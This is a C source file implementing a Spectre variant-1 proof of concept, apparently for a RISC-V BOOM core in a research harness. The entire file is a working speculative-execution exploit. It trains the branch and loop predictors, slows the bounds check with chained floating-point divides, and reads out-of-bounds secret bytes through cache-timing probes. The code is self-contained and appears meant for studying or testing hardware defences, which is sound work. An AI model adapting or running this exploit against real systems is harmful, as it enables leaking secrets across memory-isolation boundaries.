#include <string.h>

#include "spectre.h"

/* first N secret bytes only; for quick tuning runs */
#ifndef ATTACK_BYTES
#define ATTACK_BYTES SECRET_SZ
#endif

/* Longer than the 64-bit TAGE global history: the attack call always sees a
 * full taken history and is always mispredicted (a 7-long pattern is learned). */
#ifndef TRAIN_TIMES
#define TRAIN_TIMES 70
#endif
#ifndef ROUNDS
#define ROUNDS 3
#endif
#define ARRAY1_SZ 16
#define QUARTERS 4
#define QUARTER_SZ 64

/*
 * One 16 KB probe array per round, with a different base each round.  A line
 * cached by an earlier round has a different tag, so it cannot be mistaken
 * for a hit in a later round.
 */
#define ARRAY2 ((volatile uint8_t *)ARRAY2_BASE)
static uint8_t hits[256] __attribute__((aligned(64)));

/*
 * The bound check compares idx against a value that depends on a chain of
 * FP divides, so the branch resolves long after the predictor has decided.
 */
static __attribute__((noinline, noclone, noipa)) void
victim(volatile uint8_t *arr, uint64_t idx)
{
  uint64_t sz = ARRAY1_SZ << 4;
  uint64_t dummy = 2;

  __asm__ volatile(
    "fcvt.s.lu fa4, %[in]\n"
    "fcvt.s.lu fa5, %[len]\n"
    "fdiv.s fa5, fa5, fa4\n"
    "fdiv.s fa5, fa5, fa4\n"
    "fdiv.s fa5, fa5, fa4\n"
    "fdiv.s fa5, fa5, fa4\n"
    "fcvt.lu.s %[len], fa5, rtz\n"
    : [len] "+r"(sz)
    : [in] "r"(dummy)
    : "fa4", "fa5");

  if (idx < sz)
    dummy += arr[spectre_secret.array1[idx] * L1_BLOCK];

  __asm__ volatile("" : : "r"(dummy));
}

int main(void)
{
  uint64_t t0 = spectre_rdcycle();
  uint64_t attackIdx =
      (uint64_t)(spectre_secret.secret - (char *)spectre_secret.array1);
  uint8_t dummy = 0;

  spectre_flush();

  for (uint64_t len = 0; len < ATTACK_BYTES; len++) {
    memset(hits, 0, sizeof hits);

    for (uint64_t round = 0; round < ROUNDS; round++) {
      volatile uint8_t *base =
          ARRAY2 + (len * ROUNDS + round) * 256 * L1_BLOCK;

      /*
       * Probe one quarter of the possible byte values at a time.  The
       * speculative load leaves exactly one line of the current base in L1,
       * and that line is the only access to its set inside the quarter, so
       * random replacement cannot evict it before the probe.
       */
      for (int q = 0; q < QUARTERS; q++) {
        /* Vary the trip count: with a fixed count, BOOM's loop predictor
         * learns it and starts predicting the attack call correctly. */
        uint64_t train = TRAIN_TIMES + ((len * ROUNDS + round) & 3);
        __asm__ volatile("" : "+r"(train));

        for (int64_t j = (int64_t)train; j >= 0; --j) {
          uint64_t randIdx = q % ARRAY1_SZ;
          uint64_t passInIdx = (uint64_t)(j - 1) & ~(uint64_t)0xffff;
          passInIdx |= passInIdx >> 16;
          passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx));

          for (int k = 0; k < 30; k++)
            __asm__ volatile("");

          /* Keep the index opaque so GCC cannot clone victim() for a
           * constant OOB index and delete the impossible branch. */
          __asm__ volatile("" : "+r"(passInIdx));
          victim(base, passInIdx);
        }

        for (int i = q * QUARTER_SZ; i < (q + 1) * QUARTER_SZ; i++) {
          uint64_t start = spectre_rdcycle();
          dummy &= base[i * L1_BLOCK];
          __asm__ volatile("fence" ::: "memory");
          uint64_t diff = spectre_rdcycle() - start;
          if (diff < CACHE_HIT_THRESHOLD)
            hits[i]++;
        }
      }
    }

    /* array1[] is all zero, so the architecturally-taken training path
     * always touches line 0; it is not a candidate. */
    hits[0] = 0;

    uint8_t idx[2];
    uint64_t cnt[2];
    spectre_top_two(hits, idx, cnt);
    spectre_result.recovered[len] = idx[0];
    spectre_result.alt[len] = idx[1];
    spectre_result.count0[len] = (uint8_t)cnt[0];
    spectre_result.count1[len] = (uint8_t)cnt[1];
    attackIdx++;
  }

  (void)dummy;
  spectre_result.cycles = spectre_rdcycle() - t0;
  spectre_result.attempted = ATTACK_BYTES;
  spectre_result.rounds = ROUNDS;
  spectre_finish();
}
